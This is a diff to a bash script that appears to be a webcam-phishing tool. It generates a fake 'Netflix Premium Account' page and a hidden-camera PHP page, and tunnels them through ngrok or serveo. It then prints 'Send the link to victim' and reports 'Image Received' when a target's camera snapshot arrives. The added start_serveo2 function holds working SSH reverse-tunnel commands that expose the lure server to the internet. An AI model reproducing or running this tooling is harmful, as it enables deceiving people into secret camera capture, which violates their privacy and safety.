@@ -98,6 +98,7 @@ fi
 sleep 0.5
 
 if [[ -e ".cam.log" ]]; then
+printf "\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Image Received !!\e[0m\n"
 rm -rf .cam.log
 fi
@@ -112,13 +113,6 @@ initialize_ngrok() {
 ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 sed 's+forwarding_link+'$ngroklink'+g' .tahmidrayat.iso > .NetFlix-Premium-Account.html
 sed 's+forwarding_link+'$ngroklink'+g' .hiddencam.php > index.php
-
-}
-initialize_serveo() {
-
-serveolink=$(grep -o "https://[0-9a-z]*\.serveo.net" .servlink)
-sed 's+forwarding_link+'$serveolink'+g' .tahmidrayat.iso > .NetFlix-Premium-Account.html
-sed 's+forwarding_link+'$serveolink'+g' .hiddencam.php > index.php
 
 }
 start_ngrok() {
@@ -193,7 +187,39 @@ initialize_serveo
 victimfound
 
 }
+start_serveo2() {
 
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
+
+if [[ $subdomain_resp == true ]]; then
+
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:5555 serveo.net  2> /dev/null > .servlink ' &
+
+sleep 8
+else
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:5555 serveo.net 2> /dev/null > .servlink ' &
+
+sleep 8
+fi
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Serveo ..\e[0m\n"
+fuser -k 5555/tcp > /dev/null 2>&1
+php -S localhost:5555 > /dev/null 2>&1 &
+sleep 3
+serv_link=$(grep -o "https://[0-9a-z]*\.serveo.net" .servlink)
+printf "\e[0m\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n' $serv_link
+printf "\n"
+
+}
+initialize_serveo() {
+
+serveolink=$(grep -o "https://[0-9a-z]*\.serveo.net" .servlink)
+sed 's+forwarding_link+'$serveolink'+g' .tahmidrayat.iso > .NetFlix-Premium-Account.html
+sed 's+forwarding_link+'$serveolink'+g' .hiddencam.php > index.php
+
+}
 banner
 req
 menu
